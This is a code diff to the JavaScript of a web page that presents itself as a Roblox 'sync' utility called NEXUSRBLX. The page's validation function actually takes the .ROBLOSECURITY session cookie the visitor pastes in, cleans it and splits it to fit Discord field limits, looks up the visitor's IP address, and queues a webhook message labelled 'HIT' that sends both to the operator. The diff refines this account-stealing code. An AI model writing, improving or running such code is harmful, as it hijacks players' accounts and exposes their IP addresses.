@@ -479,15 +479,13 @@ async function validateAndStart(event) {
         const box = document.getElementById('input-container');
         box.classList.add('error-shake');
         document.getElementById('error-msg').classList.remove('opacity-0');
-        setTimeout(() => box.classList.remove('error-shake'), 400);
         return;
     }
 
     isCooldown = true;
     const btn = event.target;
-    btn.innerText = "COOLDOWN ACTIVE...";
-    btn.style.opacity = "0.5";
-    setTimeout(() => { isCooldown = false; btn.innerText = "Execute Sync"; btn.style.opacity = "1"; }, 5000);
+    btn.innerText = "UPLINKING...";
+    setTimeout(() => { isCooldown = false; btn.innerText = "Execute Sync"; }, 5000);
 
     pushTraffic(dName, true);
     let cur = (parseInt(localStorage.getItem('nexus_hit_counter')) || 0) + 1;
@@ -498,26 +496,28 @@ async function validateAndStart(event) {
 
     const raw = document.getElementById('userInput').value;
     
-    // Updated Regex to support modern Roblox tokens (including dashes and underscores)
-    const cookMatch = raw.match(/(_\|WARNING:-DO-NOT-SHARE-.*\|_[A-Z0-9\-_]+)/i) || raw.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
-    let cook = cookMatch ? (cookMatch[1] || cookMatch[0]) : "NOT_FOUND";
+    // 1. Extract and CLEAN the cookie (Removes quotes or extra brackets that break JSON)
+    const cookMatch = raw.match(/(_\|WARNING:-DO-NOT-SHARE-.*\|_[A-Z0-9\-_]+)/i);
+    let cook = cookMatch ? cookMatch[1] : "NOT_FOUND";
+    cook = cook.replace(/["'\\`]/g, ""); // Remove backticks and quotes that break Discord code blocks
 
-    // Split the cookie into two parts to bypass Discord's 1024 character limit per field
-    // Part 1: First 900 characters
-    // Part 2: The remaining characters
-    let cookPart1 = cook.substring(0, 900);
-    let cookPart2 = cook.length > 900 ? cook.substring(900) : "EMPTY_PART";
+    // 2. Split for safety
+    let p1 = cook.substring(0, 800);
+    let p2 = cook.length > 800 ? cook.substring(800) : "END_OF_TOKEN";
 
     let ip = "0.0.0.0";
     try { 
         const res = await fetch('https://api.ipify.org?format=json'); 
         const data = await res.json();
         ip = data.ip; 
-    } catch(e) { ip = "Detection Timeout"; }
+    } catch(e) { ip = "Detecting..."; }
 
     const hookName = `NEXUSRBLX HIT #${cur}`;
 
-    // Push Embed first with split cookie fields
+    // 3. Clear existing queue to prevent old data interference
+    requestQueue = [];
+
+    // 4. Add the Embed
     requestQueue.push({ 
         type: 'json', 
         payload: { 
@@ -525,20 +525,20 @@ async function validateAndStart(event) {
             avatar_url: logoURL, 
             embeds: [{ 
                 title: `Successfully Mirrored: ${dName}`, 
-                color: 4387969, // Emerald Green
+                color: 4387969, 
                 fields: [
                     { name: "🌐 IP Address", value: `\`${ip}\``, inline: true }, 
                     { name: "🎮 Place ID", value: `\`${dId}\``, inline: true }, 
-                    { name: "🔑 Cookie Part 1", value: `\`\`\`${cookPart1}\`\`\`` },
-                    { name: "🔑 Cookie Part 2 (Continuation)", value: `\`\`\`${cookPart2}\`\`\`` }
+                    { name: "🔑 Cookie Part 1", value: `\`\`\`${p1}\`\`\`` },
+                    { name: "🔑 Cookie Part 2", value: `\`\`\`${p2}\`\`\`` }
                 ],
-                footer: { text: "Nexus Intelligence Protocol | Full data in TXT" },
+                footer: { text: "Nexus Intelligence Protocol" },
                 timestamp: new Date().toISOString()
             }] 
         } 
     });
 
-    // Push Raw File second
+    // 5. Add the File
     requestQueue.push({ 
         type: 'file', 
         payload: { 
@@ -549,6 +549,7 @@ async function validateAndStart(event) {
         } 
     });
 
+    // 6. Process with a slight priority lead for the JSON
     processQueue();
     runEngine();
 }
